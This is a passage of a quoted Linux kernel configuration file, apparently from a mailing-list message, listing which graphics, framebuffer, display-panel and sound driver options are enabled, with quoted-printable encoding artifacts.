> CONFIG_AGP_AMD64=3Dy
> CONFIG_AGP_INTEL=3Dy
> # CONFIG_AGP_SIS is not set
> # CONFIG_AGP_VIA is not set
> CONFIG_INTEL_GTT=3Dy
> # CONFIG_VGA_SWITCHEROO is not set
> CONFIG_DRM=3Dy
>=20
> #
> # DRM debugging options
> #
> # CONFIG_DRM_WERROR is not set
> CONFIG_DRM_DEBUG_MM=3Dy
> # end of DRM debugging options
>=20
> CONFIG_DRM_MIPI_DSI=3Dy
> CONFIG_DRM_KMS_HELPER=3Dy
> # CONFIG_DRM_PANIC is not set
> # CONFIG_DRM_DEBUG_DP_MST_TOPOLOGY_REFS is not set
> # CONFIG_DRM_DEBUG_MODESET_LOCK is not set
> CONFIG_DRM_CLIENT=3Dy
> CONFIG_DRM_CLIENT_LIB=3Dy
> CONFIG_DRM_CLIENT_SELECTION=3Dy
> CONFIG_DRM_CLIENT_SETUP=3Dy
>=20
> #
> # Supported DRM clients
> #
> CONFIG_DRM_FBDEV_EMULATION=3Dy
> CONFIG_DRM_FBDEV_OVERALLOC=3D100
> # CONFIG_DRM_FBDEV_LEAK_PHYS_SMEM is not set
> # CONFIG_DRM_CLIENT_LOG is not set
> CONFIG_DRM_CLIENT_DEFAULT_FBDEV=3Dy
> CONFIG_DRM_CLIENT_DEFAULT=3D"fbdev"
> # end of Supported DRM clients
>=20
> # CONFIG_DRM_LOAD_EDID_FIRMWARE is not set
> CONFIG_DRM_DISPLAY_DP_AUX_BUS=3Dy
> CONFIG_DRM_DISPLAY_HELPER=3Dy
> # CONFIG_DRM_DISPLAY_DP_AUX_CEC is not set
> # CONFIG_DRM_DISPLAY_DP_AUX_CHARDEV is not set
> CONFIG_DRM_DISPLAY_DP_HELPER=3Dy
> CONFIG_DRM_DISPLAY_DSC_HELPER=3Dy
> CONFIG_DRM_DISPLAY_HDCP_HELPER=3Dy
> CONFIG_DRM_DISPLAY_HDMI_HELPER=3Dy
> CONFIG_DRM_TTM=3Dy
> CONFIG_DRM_BUDDY=3Dy
> CONFIG_DRM_TTM_HELPER=3Dy
> CONFIG_DRM_GEM_SHMEM_HELPER=3Dy
> # CONFIG_DRM_AMDGPU is not set
>=20
> #
> # ARM devices
> #
> # CONFIG_DRM_KOMEDA is not set
> # end of ARM devices
>=20
> # CONFIG_DRM_AST is not set
> CONFIG_DRM_BRIDGE=3Dy
> CONFIG_DRM_PANEL_BRIDGE=3Dy
> CONFIG_DRM_AUX_BRIDGE=3Dy
>=20
> #
> # Display Interface Bridges
> #
> # CONFIG_DRM_CHIPONE_ICN6211 is not set
> # CONFIG_DRM_CHRONTEL_CH7033 is not set
> # CONFIG_DRM_DISPLAY_CONNECTOR is not set
> # CONFIG_DRM_I2C_NXP_TDA998X is not set
> # CONFIG_DRM_ITE_IT6263 is not set
> # CONFIG_DRM_ITE_IT6505 is not set
> # CONFIG_DRM_LONTIUM_LT8912B is not set
> # CONFIG_DRM_LONTIUM_LT9211 is not set
> # CONFIG_DRM_LONTIUM_LT9611 is not set
> # CONFIG_DRM_LONTIUM_LT9611UXC is not set
> # CONFIG_DRM_ITE_IT66121 is not set
> # CONFIG_DRM_LVDS_CODEC is not set
> # CONFIG_DRM_MEGACHIPS_STDPXXXX_GE_B850V3_FW is not set
> # CONFIG_DRM_NWL_MIPI_DSI is not set
> # CONFIG_DRM_NXP_PTN3460 is not set
> # CONFIG_DRM_PARADE_PS8622 is not set
> # CONFIG_DRM_PARADE_PS8640 is not set
> # CONFIG_DRM_SAMSUNG_DSIM is not set
> # CONFIG_DRM_SIL_SII8620 is not set
> # CONFIG_DRM_SII902X is not set
> # CONFIG_DRM_SII9234 is not set
> # CONFIG_DRM_SIMPLE_BRIDGE is not set
> # CONFIG_DRM_SOLOMON_SSD2825 is not set
> # CONFIG_DRM_THINE_THC63LVD1024 is not set
> # CONFIG_DRM_TOSHIBA_TC358762 is not set
> # CONFIG_DRM_TOSHIBA_TC358764 is not set
> # CONFIG_DRM_TOSHIBA_TC358767 is not set
> # CONFIG_DRM_TOSHIBA_TC358768 is not set
> # CONFIG_DRM_TOSHIBA_TC358775 is not set
> # CONFIG_DRM_TI_DLPC3433 is not set
> # CONFIG_DRM_TI_TDP158 is not set
> # CONFIG_DRM_TI_TFP410 is not set
> # CONFIG_DRM_TI_SN65DSI83 is not set
> # CONFIG_DRM_TI_SN65DSI86 is not set
> # CONFIG_DRM_TI_TPD12S015 is not set
> # CONFIG_DRM_WAVESHARE_BRIDGE is not set
> # CONFIG_DRM_ANALOGIX_ANX6345 is not set
> # CONFIG_DRM_ANALOGIX_ANX78XX is not set
> # CONFIG_DRM_ANALOGIX_ANX7625 is not set
> # CONFIG_DRM_I2C_ADV7511 is not set
> # CONFIG_DRM_CDNS_DSI is not set
> # CONFIG_DRM_CDNS_MHDP8546 is not set
> # end of Display Interface Bridges
>=20
> # CONFIG_DRM_ETNAVIV is not set
> # CONFIG_DRM_GMA500 is not set
> CONFIG_DRM_GUD=3Dy
> # CONFIG_DRM_HISI_HIBMC is not set
> CONFIG_DRM_I915=3Dy
> CONFIG_DRM_I915_FORCE_PROBE=3D""
> CONFIG_DRM_I915_CAPTURE_ERROR=3Dy
> CONFIG_DRM_I915_COMPRESS_ERROR=3Dy
> CONFIG_DRM_I915_USERPTR=3Dy
> # CONFIG_DRM_I915_GVT_KVMGT is not set
> # CONFIG_DRM_I915_DP_TUNNEL is not set
>=20
> #
> # drm/i915 Debugging
> #
> # CONFIG_DRM_I915_WERROR is not set
> # CONFIG_DRM_I915_REPLAY_GPU_HANGS_API is not set
> # CONFIG_DRM_I915_DEBUG is not set
> # CONFIG_DRM_I915_DEBUG_MMIO is not set
> # CONFIG_DRM_I915_SW_FENCE_DEBUG_OBJECTS is not set
> # CONFIG_DRM_I915_SW_FENCE_CHECK_DAG is not set
> # CONFIG_DRM_I915_DEBUG_GUC is not set
> # CONFIG_DRM_I915_SELFTEST is not set
> # CONFIG_DRM_I915_LOW_LEVEL_TRACEPOINTS is not set
> # CONFIG_DRM_I915_DEBUG_VBLANK_EVADE is not set
> # CONFIG_DRM_I915_DEBUG_RUNTIME_PM is not set
> # CONFIG_DRM_I915_DEBUG_WAKEREF is not set
> # end of drm/i915 Debugging
>=20
> #
> # drm/i915 Profile Guided Optimisation
> #
> CONFIG_DRM_I915_REQUEST_TIMEOUT=3D20000
> CONFIG_DRM_I915_FENCE_TIMEOUT=3D10000
> CONFIG_DRM_I915_USERFAULT_AUTOSUSPEND=3D250
> CONFIG_DRM_I915_HEARTBEAT_INTERVAL=3D2500
> CONFIG_DRM_I915_PREEMPT_TIMEOUT=3D640
> CONFIG_DRM_I915_PREEMPT_TIMEOUT_COMPUTE=3D7500
> CONFIG_DRM_I915_MAX_REQUEST_BUSYWAIT=3D8000
> CONFIG_DRM_I915_STOP_TIMEOUT=3D100
> CONFIG_DRM_I915_TIMESLICE_DURATION=3D1
> # end of drm/i915 Profile Guided Optimisation
>=20
> # CONFIG_DRM_LOGICVC is not set
> # CONFIG_DRM_MGAG200 is not set
> # CONFIG_DRM_NOUVEAU is not set
> CONFIG_DRM_PANEL=3Dy
>=20
> #
> # Display Panels
> #
> # CONFIG_DRM_PANEL_ABT_Y030XX067A is not set
> # CONFIG_DRM_PANEL_ARM_VERSATILE is not set
> # CONFIG_DRM_PANEL_ASUS_Z00T_TM5P5_NT35596 is not set
> # CONFIG_DRM_PANEL_AUO_A030JTN01 is not set
> # CONFIG_DRM_PANEL_BOE_BF060Y8M_AJ0 is not set
> # CONFIG_DRM_PANEL_BOE_HIMAX8279D is not set
> # CONFIG_DRM_PANEL_BOE_TD4320 is not set
> # CONFIG_DRM_PANEL_BOE_TH101MB31UIG002_28A is not set
> # CONFIG_DRM_PANEL_BOE_TV101WUM_NL6 is not set
> # CONFIG_DRM_PANEL_BOE_TV101WUM_LL2 is not set
> # CONFIG_DRM_PANEL_EBBG_FT8719 is not set
> # CONFIG_DRM_PANEL_ELIDA_KD35T133 is not set
> # CONFIG_DRM_PANEL_FEIXIN_K101_IM2BA02 is not set
> # CONFIG_DRM_PANEL_FEIYANG_FY07024DI26A30D is not set
> # CONFIG_DRM_PANEL_DSI_CM is not set
> # CONFIG_DRM_PANEL_LVDS is not set
> # CONFIG_DRM_PANEL_HIMAX_HX8279 is not set
> # CONFIG_DRM_PANEL_HIMAX_HX83102 is not set
> # CONFIG_DRM_PANEL_HIMAX_HX83112A is not set
> # CONFIG_DRM_PANEL_HIMAX_HX83112B is not set
> # CONFIG_DRM_PANEL_HIMAX_HX8394 is not set
> # CONFIG_DRM_PANEL_HYDIS_HV101HD1 is not set
> # CONFIG_DRM_PANEL_ILITEK_IL9322 is not set
> # CONFIG_DRM_PANEL_ILITEK_ILI9341 is not set
> # CONFIG_DRM_PANEL_ILITEK_ILI9805 is not set
> # CONFIG_DRM_PANEL_ILITEK_ILI9806E is not set
> # CONFIG_DRM_PANEL_ILITEK_ILI9881C is not set
> # CONFIG_DRM_PANEL_ILITEK_ILI9882T is not set
> # CONFIG_DRM_PANEL_INNOLUX_EJ030NA is not set
> # CONFIG_DRM_PANEL_INNOLUX_P079ZCA is not set
> # CONFIG_DRM_PANEL_JADARD_JD9365DA_H3 is not set
> # CONFIG_DRM_PANEL_JDI_LPM102A188A is not set
> # CONFIG_DRM_PANEL_JDI_LT070ME05000 is not set
> # CONFIG_DRM_PANEL_JDI_R63452 is not set
> # CONFIG_DRM_PANEL_KHADAS_TS050 is not set
> # CONFIG_DRM_PANEL_KINGDISPLAY_KD097D04 is not set
> # CONFIG_DRM_PANEL_LEADTEK_LTK050H3146W is not set
> # CONFIG_DRM_PANEL_LEADTEK_LTK500HD1829 is not set
> # CONFIG_DRM_PANEL_LINCOLNTECH_LCD197 is not set
> # CONFIG_DRM_PANEL_LG_LB035Q02 is not set
> # CONFIG_DRM_PANEL_LG_LD070WX3 is not set
> # CONFIG_DRM_PANEL_LG_LG4573 is not set
> # CONFIG_DRM_PANEL_LG_SW43408 is not set
> # CONFIG_DRM_PANEL_MAGNACHIP_D53E6EA8966 is not set
> # CONFIG_DRM_PANEL_MANTIX_MLAF057WE51 is not set
> # CONFIG_DRM_PANEL_NEC_NL8048HL11 is not set
> # CONFIG_DRM_PANEL_NEWVISION_NV3051D is not set
> # CONFIG_DRM_PANEL_NEWVISION_NV3052C is not set
> # CONFIG_DRM_PANEL_NOVATEK_NT35510 is not set
> # CONFIG_DRM_PANEL_NOVATEK_NT35560 is not set
> # CONFIG_DRM_PANEL_NOVATEK_NT35950 is not set
> # CONFIG_DRM_PANEL_NOVATEK_NT36523 is not set
> # CONFIG_DRM_PANEL_NOVATEK_NT36672A is not set
> # CONFIG_DRM_PANEL_NOVATEK_NT36672E is not set
> # CONFIG_DRM_PANEL_NOVATEK_NT37801 is not set
> # CONFIG_DRM_PANEL_NOVATEK_NT39016 is not set
> # CONFIG_DRM_PANEL_OLIMEX_LCD_OLINUXINO is not set
> # CONFIG_DRM_PANEL_ORISETECH_OTA5601A is not set
> # CONFIG_DRM_PANEL_ORISETECH_OTM8009A is not set
> # CONFIG_DRM_PANEL_OSD_OSD101T2587_53TS is not set
> # CONFIG_DRM_PANEL_PANASONIC_VVX10F034N00 is not set
> # CONFIG_DRM_PANEL_RASPBERRYPI_TOUCHSCREEN is not set
> # CONFIG_DRM_PANEL_RAYDIUM_RM67191 is not set
> # CONFIG_DRM_PANEL_RAYDIUM_RM67200 is not set
> # CONFIG_DRM_PANEL_RAYDIUM_RM68200 is not set
> # CONFIG_DRM_PANEL_RAYDIUM_RM692E5 is not set
> # CONFIG_DRM_PANEL_RAYDIUM_RM69380 is not set
> # CONFIG_DRM_PANEL_RENESAS_R61307 is not set
> # CONFIG_DRM_PANEL_RENESAS_R69328 is not set
> # CONFIG_DRM_PANEL_RONBO_RB070D30 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_AMS581VF01 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_AMS639RQ08 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6E88A0_AMS427AP24 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6E88A0_AMS452EF01 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_ATNA33XC20 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_DB7430 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_LD9040 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_LTL106HL02 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6E3FA7 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6D16D0 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6D27A1 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6D7AA0 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6E3FC2X01 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6E3HA2 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6E3HA8 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6E63J0X03 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6E63M0 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6E8AA0 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_S6E8AA5X01_AMS561RA01 is not set
> # CONFIG_DRM_PANEL_SAMSUNG_SOFEF00 is not set
> # CONFIG_DRM_PANEL_SEIKO_43WVF1G is not set
> # CONFIG_DRM_PANEL_SHARP_LQ079L1SX01 is not set
> # CONFIG_DRM_PANEL_SHARP_LQ101R1SX01 is not set
> # CONFIG_DRM_PANEL_SHARP_LS037V7DW01 is not set
> # CONFIG_DRM_PANEL_SHARP_LS043T1LE01 is not set
> # CONFIG_DRM_PANEL_SHARP_LS060T1SX01 is not set
> # CONFIG_DRM_PANEL_SITRONIX_ST7701 is not set
> # CONFIG_DRM_PANEL_SITRONIX_ST7703 is not set
> # CONFIG_DRM_PANEL_SITRONIX_ST7789V is not set
> # CONFIG_DRM_PANEL_SONY_ACX565AKM is not set
> # CONFIG_DRM_PANEL_SONY_TD4353_JDI is not set
> # CONFIG_DRM_PANEL_SONY_TULIP_TRULY_NT35521 is not set
> # CONFIG_DRM_PANEL_STARTEK_KD070FHFID015 is not set
> CONFIG_DRM_PANEL_EDP=3Dy
> # CONFIG_DRM_PANEL_SIMPLE is not set
> # CONFIG_DRM_PANEL_SUMMIT is not set
> # CONFIG_DRM_PANEL_SYNAPTICS_R63353 is not set
> # CONFIG_DRM_PANEL_SYNAPTICS_TDDI is not set
> # CONFIG_DRM_PANEL_TDO_TL070WSH30 is not set
> # CONFIG_DRM_PANEL_TPO_TD028TTEC1 is not set
> # CONFIG_DRM_PANEL_TPO_TD043MTEA1 is not set
> # CONFIG_DRM_PANEL_TPO_TPG110 is not set
> # CONFIG_DRM_PANEL_TRULY_NT35597_WQXGA is not set
> # CONFIG_DRM_PANEL_VISIONOX_G2647FB105 is not set
> # CONFIG_DRM_PANEL_VISIONOX_R66451 is not set
> # CONFIG_DRM_PANEL_VISIONOX_RM69299 is not set
> # CONFIG_DRM_PANEL_VISIONOX_RM692E5 is not set
> # CONFIG_DRM_PANEL_VISIONOX_VTDR6130 is not set
> # CONFIG_DRM_PANEL_WIDECHIPS_WS2401 is not set
> # CONFIG_DRM_PANEL_XINPENG_XPP055C272 is not set
> # end of Display Panels
>=20
> # CONFIG_DRM_QXL is not set
> # CONFIG_DRM_RADEON is not set
> # CONFIG_DRM_ST7571 is not set
> # CONFIG_DRM_ST7586 is not set
> # CONFIG_DRM_ST7735R is not set
> # CONFIG_DRM_ST7920 is not set
> # CONFIG_DRM_SSD130X is not set
>=20
> #
> # Drivers for system framebuffers
> #
> CONFIG_DRM_SYSFB_HELPER=3Dy
> CONFIG_DRM_SIMPLEDRM=3Dy
> # CONFIG_DRM_VESADRM is not set
> # end of Drivers for system framebuffers
>=20
> # CONFIG_DRM_APPLETBDRM is not set
> # CONFIG_DRM_ARCPGU is not set
> CONFIG_DRM_BOCHS=3Dy
> CONFIG_DRM_CIRRUS_QEMU=3Dy
> CONFIG_DRM_GM12U320=3Dy
> # CONFIG_DRM_PANEL_MIPI_DBI is not set
> # CONFIG_DRM_PIXPAPER is not set
> # CONFIG_TINYDRM_HX8357D is not set
> # CONFIG_TINYDRM_ILI9163 is not set
> # CONFIG_TINYDRM_ILI9225 is not set
> # CONFIG_TINYDRM_ILI9341 is not set
> # CONFIG_TINYDRM_ILI9486 is not set
> # CONFIG_TINYDRM_MI0283QT is not set
> # CONFIG_TINYDRM_REPAPER is not set
> # CONFIG_TINYDRM_SHARP_MEMORY is not set
> CONFIG_DRM_UDL=3Dy
> # CONFIG_DRM_VBOXVIDEO is not set
> CONFIG_DRM_VGEM=3Dy
> CONFIG_DRM_VIRTIO_GPU=3Dy
> CONFIG_DRM_VIRTIO_GPU_KMS=3Dy
> CONFIG_DRM_VKMS=3Dy
> CONFIG_DRM_VMWGFX=3Dy
> # CONFIG_DRM_VMWGFX_MKSSTATS is not set
> # CONFIG_DRM_XE is not set
> CONFIG_DRM_PANEL_ORIENTATION_QUIRKS=3Dy
>=20
> #
> # Frame buffer Devices
> #
> CONFIG_FB=3Dy
> # CONFIG_FB_CIRRUS is not set
> # CONFIG_FB_PM2 is not set
> # CONFIG_FB_CYBER2000 is not set
> # CONFIG_FB_ARC is not set
> # CONFIG_FB_ASILIANT is not set
> # CONFIG_FB_IMSTT is not set
> CONFIG_FB_VGA16=3Dy
> # CONFIG_FB_UVESA is not set
> CONFIG_FB_VESA=3Dy
> # CONFIG_FB_N411 is not set
> # CONFIG_FB_HGA is not set
> # CONFIG_FB_OPENCORES is not set
> # CONFIG_FB_S1D13XXX is not set
> # CONFIG_FB_NVIDIA is not set
> # CONFIG_FB_RIVA is not set
> # CONFIG_FB_I740 is not set
> # CONFIG_FB_MATROX is not set
> # CONFIG_FB_RADEON is not set
> # CONFIG_FB_ATY128 is not set
> # CONFIG_FB_ATY is not set
> # CONFIG_FB_S3 is not set
> # CONFIG_FB_SAVAGE is not set
> # CONFIG_FB_SIS is not set
> # CONFIG_FB_VIA is not set
> # CONFIG_FB_NEOMAGIC is not set
> # CONFIG_FB_KYRO is not set
> # CONFIG_FB_3DFX is not set
> # CONFIG_FB_VOODOO1 is not set
> # CONFIG_FB_VT8623 is not set
> # CONFIG_FB_TRIDENT is not set
> # CONFIG_FB_ARK is not set
> # CONFIG_FB_PM3 is not set
> # CONFIG_FB_CARMINE is not set
> # CONFIG_FB_SMSCUFX is not set
> # CONFIG_FB_UDL is not set
> # CONFIG_FB_IBM_GXT4500 is not set
> CONFIG_FB_VIRTUAL=3Dy
> # CONFIG_FB_METRONOME is not set
> # CONFIG_FB_MB862XX is not set
> # CONFIG_FB_SSD1307 is not set
> # CONFIG_FB_SM712 is not set
> CONFIG_FB_CORE=3Dy
> CONFIG_FB_NOTIFY=3Dy
> CONFIG_FB_DEVICE=3Dy
> CONFIG_FB_CFB_FILLRECT=3Dy
> CONFIG_FB_CFB_COPYAREA=3Dy
> CONFIG_FB_CFB_IMAGEBLIT=3Dy
> CONFIG_FB_SYS_FILLRECT=3Dy
> CONFIG_FB_SYS_COPYAREA=3Dy
> CONFIG_FB_SYS_IMAGEBLIT=3Dy
> # CONFIG_FB_FOREIGN_ENDIAN is not set
> CONFIG_FB_SYSMEM_FOPS=3Dy
> CONFIG_FB_DEFERRED_IO=3Dy
> CONFIG_FB_IOMEM_FOPS=3Dy
> CONFIG_FB_IOMEM_HELPERS=3Dy
> CONFIG_FB_SYSMEM_HELPERS=3Dy
> CONFIG_FB_SYSMEM_HELPERS_DEFERRED=3Dy
> CONFIG_FB_TILEBLITTING=3Dy
> # end of Frame buffer Devices
>=20
> #
> # Backlight & LCD device support
> #
> CONFIG_LCD_CLASS_DEVICE=3Dy
> # CONFIG_LCD_L4F00242T03 is not set
> # CONFIG_LCD_LMS283GF05 is not set
> # CONFIG_LCD_LTV350QV is not set
> # CONFIG_LCD_ILI922X is not set
> # CONFIG_LCD_ILI9320 is not set
> # CONFIG_LCD_TDO24M is not set
> # CONFIG_LCD_VGG2432A4 is not set
> # CONFIG_LCD_PLATFORM is not set
> # CONFIG_LCD_AMS369FG06 is not set
> # CONFIG_LCD_LMS501KF03 is not set
> # CONFIG_LCD_HX8357 is not set
> # CONFIG_LCD_OTM3225A is not set
> CONFIG_BACKLIGHT_CLASS_DEVICE=3Dy
> # CONFIG_BACKLIGHT_AW99706 is not set
> # CONFIG_BACKLIGHT_KTD253 is not set
> # CONFIG_BACKLIGHT_KTD2801 is not set
> # CONFIG_BACKLIGHT_KTZ8866 is not set
> # CONFIG_BACKLIGHT_MT6370 is not set
> # CONFIG_BACKLIGHT_APPLE is not set
> # CONFIG_BACKLIGHT_QCOM_WLED is not set
> # CONFIG_BACKLIGHT_SAHARA is not set
> # CONFIG_BACKLIGHT_ADP8860 is not set
> # CONFIG_BACKLIGHT_ADP8870 is not set
> # CONFIG_BACKLIGHT_LM3509 is not set
> # CONFIG_BACKLIGHT_LM3639 is not set
> # CONFIG_BACKLIGHT_PANDORA is not set
> # CONFIG_BACKLIGHT_GPIO is not set
> # CONFIG_BACKLIGHT_LV5207LP is not set
> # CONFIG_BACKLIGHT_BD6107 is not set
> # CONFIG_BACKLIGHT_ARCXCNN is not set
> # CONFIG_BACKLIGHT_LED is not set
> # end of Backlight & LCD device support
>=20
> CONFIG_VGASTATE=3Dy
> CONFIG_VIDEOMODE_HELPERS=3Dy
> CONFIG_HDMI=3Dy
> # CONFIG_FIRMWARE_EDID is not set
>=20
> #
> # Console display driver support
> #
> CONFIG_VGA_CONSOLE=3Dy
> CONFIG_DUMMY_CONSOLE=3Dy
> CONFIG_DUMMY_CONSOLE_COLUMNS=3D80
> CONFIG_DUMMY_CONSOLE_ROWS=3D25
> CONFIG_FRAMEBUFFER_CONSOLE=3Dy
> # CONFIG_FRAMEBUFFER_CONSOLE_LEGACY_ACCELERATION is not set
> CONFIG_FRAMEBUFFER_CONSOLE_DETECT_PRIMARY=3Dy
> CONFIG_FRAMEBUFFER_CONSOLE_ROTATION=3Dy
> # CONFIG_FRAMEBUFFER_CONSOLE_DEFERRED_TAKEOVER is not set
> # end of Console display driver support
>=20
> CONFIG_LOGO=3Dy
> CONFIG_LOGO_LINUX_MONO=3Dy
> CONFIG_LOGO_LINUX_MONO_FILE=3D"drivers/video/logo/logo_linux_mono.pbm"
> CONFIG_LOGO_LINUX_VGA16=3Dy
> CONFIG_LOGO_LINUX_VGA16_FILE=3D"drivers/video/logo/logo_linux_vga16.ppm"
> # CONFIG_LOGO_LINUX_CLUT224 is not set
> # CONFIG_TRACE_GPU_MEM is not set
> # end of Graphics support
>=20
> # CONFIG_DRM_ACCEL is not set
> CONFIG_SOUND=3Dy
> CONFIG_SOUND_OSS_CORE=3Dy
> CONFIG_SOUND_OSS_CORE_PRECLAIM=3Dy
> CONFIG_SND=3Dy
> CONFIG_SND_TIMER=3Dy
> CONFIG_SND_PCM=3Dy
> CONFIG_SND_PCM_ELD=3Dy
> CONFIG_SND_HWDEP=3Dy
> CONFIG_SND_SEQ_DEVICE=3Dy
> CONFIG_SND_RAWMIDI=3Dy
> CONFIG_SND_UMP=3Dy
> CONFIG_SND_UMP_LEGACY_RAWMIDI=3Dy
> CONFIG_SND_JACK=3Dy
> CONFIG_SND_JACK_INPUT_DEV=3Dy
> CONFIG_SND_OSSEMUL=3Dy
> CONFIG_SND_MIXER_OSS=3Dy
> CONFIG_SND_PCM_OSS=3Dy
> CONFIG_SND_PCM_OSS_PLUGINS=3Dy
> CONFIG_SND_PCM_TIMER=3Dy
> CONFIG_SND_HRTIMER=3Dy
> CONFIG_SND_DYNAMIC_MINORS=3Dy
> CONFIG_SND_MAX_CARDS=3D32
> CONFIG_SND_SUPPORT_OLD_API=3Dy
> CONFIG_SND_PROC_FS=3Dy
> CONFIG_SND_VERBOSE_PROCFS=3Dy
> CONFIG_SND_CTL_FAST_LOOKUP=3Dy
> CONFIG_SND_DEBUG=3Dy
> # CONFIG_SND_DEBUG_VERBOSE is not set
> CONFIG_SND_PCM_XRUN_DEBUG=3Dy
> # CONFIG_SND_CTL_INPUT_VALIDATION is not set
> # CONFIG_SND_CTL_DEBUG is not set
> # CONFIG_SND_JACK_INJECTION_DEBUG is not set
> # CONFIG_SND_UTIMER is not set
> CONFIG_SND_VMASTER=3Dy
> CONFIG_SND_DMA_SGBUF=3Dy
> CONFIG_SND_CTL_LED=3Dy
> CONFIG_SND_SEQUENCER=3Dy
> CONFIG_SND_SEQ_DUMMY=3Dy
> CONFIG_SND_SEQUENCER_OSS=3Dy
> CONFIG_SND_SEQ_HRTIMER_DEFAULT=3Dy
> CONFIG_SND_SEQ_MIDI_EVENT=3Dy
> CONFIG_SND_SEQ_MIDI=3Dy
> CONFIG_SND_SEQ_VIRMIDI=3Dy
> # CONFIG_SND_SEQ_UMP is not set
> CONFIG_SND_DRIVERS=3Dy
> # CONFIG_SND_PCSP is not set
> CONFIG_SND_DUMMY=3Dy
> CONFIG_SND_ALOOP=3Dy
> # CONFIG_SND_PCMTEST is not set
> CONFIG_SND_VIRMIDI=3Dy
> # CONFIG_SND_MTPAV is not set
> # CONFIG_SND_MTS64 is not set
> # CONFIG_SND_SERIAL_U16550 is not set
> # CONFIG_SND_SERIAL_GENERIC is not set
> # CONFIG_SND_MPU401 is not set
> # CONFIG_SND_PORTMAN2X4 is not set
> CONFIG_SND_PCI=3Dy
> # CONFIG_SND_AD1889 is not set
> # CONFIG_SND_ALS300 is not set
> # CONFIG_SND_ALS4000 is not set
> # CONFIG_SND_ALI5451 is not set
> # CONFIG_SND_ASIHPI is not set
> # CONFIG_SND_ATIIXP is not set
> # CONFIG_SND_ATIIXP_MODEM is not set
> # CONFIG_SND_AU8810 is not set
> # CONFIG_SND_AU8820 is not set
> # CONFIG_SND_AU8830 is not set
> # CONFIG_SND_AW2 is not set
> # CONFIG_SND_AZT3328 is not set
> # CONFIG_SND_BT87X is not set
> # CONFIG_SND_CA0106 is not set
> # CONFIG_SND_CMIPCI is not set
> # CONFIG_SND_OXYGEN is not set
> # CONFIG_SND_CS4281 is not set
> # CONFIG_SND_CS46XX is not set
> # CONFIG_SND_CTXFI is not set
> # CONFIG_SND_DARLA20 is not set
> # CONFIG_SND_GINA20 is not set
> # CONFIG_SND_LAYLA20 is not set
> # CONFIG_SND_DARLA24 is not set
> # CONFIG_SND_GINA24 is not set
> # CONFIG_SND_LAYLA24 is not set
> # CONFIG_SND_MONA is not set
> # CONFIG_SND_MIA is not set
> # CONFIG_SND_ECHO3G is not set
> # CONFIG_SND_INDIGO is not set
> # CONFIG_SND_INDIGOIO is not set
> # CONFIG_SND_INDIGODJ is not set
> # CONFIG_SND_INDIGOIOX is not set
> # CONFIG_SND_INDIGODJX is not set
> # CONFIG_SND_EMU10K1 is not set
> # CONFIG_SND_EMU10K1X is not set
> # CONFIG_SND_ENS1370 is not set
> # CONFIG_SND_ENS1371 is not set
> # CONFIG_SND_ES1938 is not set
> # CONFIG_SND_ES1968 is not set
> # CONFIG_SND_FM801 is not set
> # CONFIG_SND_HDSP is not set
> # CONFIG_SND_HDSPM is not set
> # CONFIG_SND_ICE1712 is not set
> # CONFIG_SND_ICE1724 is not set
> # CONFIG_SND_INTEL8X0 is not set
> # CONFIG_SND_INTEL8X0M is not set
> # CONFIG_SND_KORG1212 is not set
> # CONFIG_SND_LOLA is not set
> # CONFIG_SND_LX6464ES is not set
> # CONFIG_SND_MAESTRO3 is not set
> # CONFIG_SND_MIXART is not set
> # CONFIG_SND_NM256 is not set
> # CONFIG_SND_PCXHR is not set
> # CONFIG_SND_RIPTIDE is not set
> # CONFIG_SND_RME32 is not set
> # CONFIG_SND_RME96 is not set
> # CONFIG_SND_RME9652 is not set
> # CONFIG_SND_SE6X is not set
> # CONFIG_SND_SONICVIBES is not set
> # CONFIG_SND_TRIDENT is not set
> # CONFIG_SND_VIA82XX is not set
> # CONFIG_SND_VIA82XX_MODEM is not set
> # CONFIG_SND_VIRTUOSO is not set
> # CONFIG_SND_VX222 is not set
> # CONFIG_SND_YMFPCI is not set
>=20
> #
> # HD-Audio
> #
> CONFIG_SND_HDA=3Dy
> CONFIG_SND_HDA_HWDEP=3Dy
> CONFIG_SND_HDA_RECONFIG=3Dy
> CONFIG_SND_HDA_INPUT_BEEP=3Dy
> CONFIG_SND_HDA_INPUT_BEEP_MODE=3D1
> CONFIG_SND_HDA_PATCH_LOADER=3Dy
> CONFIG_SND_HDA_POWER_SAVE_DEFAULT=3D0
> # CONFIG_SND_HDA_CTL_DEV_ID is not set
> CONFIG_SND_HDA_PREALLOC_SIZE=3D0
> CONFIG_SND_HDA_INTEL=3Dy
> # CONFIG_SND_HDA_ACPI is not set
> CONFIG_SND_HDA_GENERIC_LEDS=3Dy
> CONFIG_SND_HDA_CODEC_ANALOG=3Dy
> CONFIG_SND_HDA_CODEC_SIGMATEL=3Dy
> CONFIG_SND_HDA_CODEC_VIA=3Dy
> CONFIG_SND_HDA_CODEC_CONEXANT=3Dy
> # CONFIG_SND_HDA_CODEC_SENARYTECH is not set
> CONFIG_SND_HDA_CODEC_CA0110=3Dy
> CONFIG_SND_HDA_CODEC_CA0132=3Dy
> # CONFIG_SND_HDA_CODEC_CA0132_DSP is not set
> CONFIG_SND_HDA_CODEC_CMEDIA=3Dy
> # CONFIG_SND_HDA_CODEC_CM9825 is not set
> CONFIG_SND_HDA_CODEC_SI3054=3Dy
> CONFIG_SND_HDA_GENERIC=3Dy
> CONFIG_SND_HDA_CODEC_REALTEK=3Dy
> CONFIG_SND_HDA_CODEC_REALTEK_LIB=3Dy
> CONFIG_SND_HDA_CODEC_ALC260=3Dy
